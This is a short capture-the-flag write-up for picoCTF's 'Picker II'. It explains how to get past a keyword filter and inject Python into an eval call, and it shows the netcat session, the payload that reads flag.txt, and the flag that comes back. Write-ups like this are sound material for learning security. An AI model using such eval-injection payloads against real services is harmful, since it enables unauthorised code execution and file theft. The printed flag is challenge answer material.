# Picker II

The same vulnerability is present here: see Picker I. However, now there's this check which we will have to bypass:

```
def filter(user_input):
  if 'win' in user_input:
    return False
  return True
```

The `()` is still appended to the input, so we have to craft a payload that both prints the flag file to the screen, and doesn't throw an error when `()` is added. It has to be a single statement (not multiple ones split by a semi-colon): `eval` only accepts one. I found such a statement after digging around in the Python docs for a while:

```
$ nc saturn.picoctf.net 56118
==> getRandomNumber
4
==> print(open("flag.txt","r").read()).__sizeof__                  
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}
```

This works because the call `print(open("flag.txt","r").read())` returns `none`, and `__sizeof__` even exists on the `NoneType`.
